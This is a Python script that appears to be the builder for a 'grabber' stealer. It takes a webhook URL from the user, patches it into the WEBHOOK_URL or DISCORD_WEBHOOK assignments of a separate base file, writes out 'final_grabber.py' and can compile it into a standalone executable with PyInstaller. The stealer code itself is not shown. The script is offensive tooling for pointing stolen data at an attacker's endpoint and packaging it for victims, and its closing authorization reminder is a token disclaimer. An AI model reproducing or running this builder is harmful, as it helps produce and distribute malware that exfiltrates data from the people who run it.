#!/usr/bin/env python3
import sys
import time
from pathlib import Path
import shutil
import re
import subprocess
import pystyle
from colorama import init, Fore, Style
sys.path.append(str(Path(__file__).parent.parent))

# Initialize colorama for Windows
init(autoreset=True)

try:
    from pystyle import Colorate, Colors
    PYSTYLE_AVAILABLE = True
except Exception:
    PYSTYLE_AVAILABLE = False

ascii_art = r"""

 _   ____     ____   _  _     ____  
| | / ___|   / ___| | || |   |  _ \ 
| | \___ \  | |     | || |_  | |_) |
|_|  ___) | | |___  |__   _| |  _ < 
(_) |____/   \____|    |_|   |_| \_\


"""

def print_ascii():
    term_size = shutil.get_terminal_size(fallback=(80, 24))
    width, height = term_size.columns, term_size.lines
   
    lines = ascii_art.strip('\n').splitlines()
    centeWHITE_lines = [line.center(width) for line in lines]

    empty_lines = height - len(centeWHITE_lines)
    max_margin = 5  # max 5 lines margin top or bottom

    if empty_lines > 0:
        top_margin = min(empty_lines // 2, max_margin)
        bottom_margin = min(empty_lines - top_margin, max_margin)
    else:
        top_margin = 0
        bottom_margin = 0

    full_text = "\n" * top_margin + "\n".join(centeWHITE_lines) + "\n" * bottom_margin

    if PYSTYLE_AVAILABLE:
        try:
            print(Colorate.Vertical(Colors.blue_to_cyan, full_text))
            return
        except Exception:
            print(full_text)
    else:
        print(full_text)

def validate_url(u: str) -> bool:
    return u.startswith("http://") or u.startswith("https://")

def backup_file(path: Path) -> Path:
    bak = path.with_suffix(path.suffix + ".bak")
    shutil.copy2(path, bak)
    return bak

def replace_webhook_assignment(text: str, new_url: str, keys=None):
    if keys is None:
        keys = ["WEBHOOK_URL"]
    total_n = 0
    new_text = text
    for key in keys:
        pattern = re.compile(r'(' + re.escape(key) + r'\s*=\s*)(["\'])(.*?)\2', flags=re.IGNORECASE)
        def repl(m):
            return f"{m.group(1)}{m.group(2)}{new_url}{m.group(2)}"
        new_text, n = pattern.subn(repl, new_text)
        total_n += n
    return new_text, total_n

def write_output(py_text: str, out_path: Path) -> Path:
    out_path.write_text(py_text, encoding="utf-8")
    return out_path

def build_exe(py_path: Path, name: str, icon: Path = None) -> bool:
    cmd = ["pyinstaller", "--onefile", "--name", name, str(py_path)]
    if icon:
        cmd.extend(["--icon", str(icon)])
    print(f"{Fore.CYAN}Launching PyInstaller: {' '.join(cmd)}{Style.RESET_ALL}")
    try:
        proc = subprocess.run(cmd, check=False)
        return proc.returncode == 0
    except FileNotFoundError:
        print(f"{Fore.WHITE}Error: 'pyinstaller' not found. Install it with 'pip install pyinstaller'.{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.WHITE}Error running PyInstaller: {e}{Style.RESET_ALL}")
        return False

def main():
    print_ascii()

    base_path = Path("programme") / "basecode.py"
    if not base_path.exists():
        print(f"{Fore.WHITE}[Error] 'basecode.py' not found.{Style.RESET_ALL}")
        sys.exit(1)

    webhook = input("\nwebhook url > ").strip()
    if not validate_url(webhook):
        print(f"{Fore.WHITE}[Error] Invalid URL. It must start with http:// or https://{Style.RESET_ALL}")
        sys.exit(1)

    out_name = input("Personalize Name (no extension) [final_grabber]: ").strip() or "final_grabber"
    choix = input("Python Or Exe ? (py/exe) [py]: ").strip().lower() or "py"
    if choix not in ("py", "exe"):
        print(f"{Fore.YELLOW}Invalid choice, defaulting to 'py'.{Style.RESET_ALL}")
        choix = "py"

    try:
        src = base_path.read_text(encoding="utf-8")
    except Exception as e:
        print(f"{Fore.WHITE}[Error] Could not read '{base_path}': {e}{Style.RESET_ALL}")
        sys.exit(1)

    try:
        bak = backup_file(base_path)
        print(f"{Fore.CYAN}Backup created: {bak}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.WHITE}[Error] Could not create backup: {e}{Style.RESET_ALL}")
        sys.exit(1)

    keys = ["WEBHOOK_URL", "WEBHOOK", "DISCORD_WEBHOOK"]
    new_src, n = replace_webhook_assignment(src, webhook, keys=keys)

    if n == 0:
        print(f"{Fore.YELLOW}[Warning] No assignment pattern ({', '.join(keys)}) found in basecode.py.{Style.RESET_ALL}")
        do_exact = input("Do you want to attempt an exact replacement of a known URL in the file? (yes/no) [no] ").strip().lower()
        if do_exact in ("yes","y"):
            old = input("Exact old URL to replace > ").strip()
            if old and old in src:
                new_src = src.replace(old, webhook)
                n = src.count(old)
                print(f"{Fore.GREEN}Exact replacement done: {n} occurrence(s).{Style.RESET_ALL}")
            else:
                print(f"{Fore.WHITE}Old URL not found. No changes applied.{Style.RESET_ALL}")
                new_src = src
                n = 0
        else:
            print("No changes applied.")
    else:
        print(f"{Fore.GREEN}Replacement done: {n} assignment(s) updated (keys: {', '.join(keys)}).{Style.RESET_ALL}")

    out_dir = Path("build_output")
    out_dir.mkdir(parents=True, exist_ok=True)
    py_out_path = out_dir / f"{out_name}.py"
    try:
        write_output(new_src, py_out_path)
        print(f"{Fore.GREEN}[✓] Python file written: {py_out_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.WHITE}[Error] Could not write output file: {e}{Style.RESET_ALL}")
        sys.exit(1)

    if choix == "exe":
        confirm = input("Run PyInstaller? (yes/no) [no]: ").strip().lower() or "no"
        if confirm in ("yes","y"):
            success = build_exe(py_out_path, out_name)
            if success:
                print(f"{Fore.GREEN}[✓] PyInstaller finished. Check the 'dist' folder.{Style.RESET_ALL}")
            else:
                print(f"{Fore.WHITE}[✗] PyInstaller error.{Style.RESET_ALL}")
        else:
            print("Compilation to .exe cancelled. The .py file is available in build_output.")

    print("\n=== Finished ===")
    print("Reminder: only use this tool on files for which you have explicit authorization.")


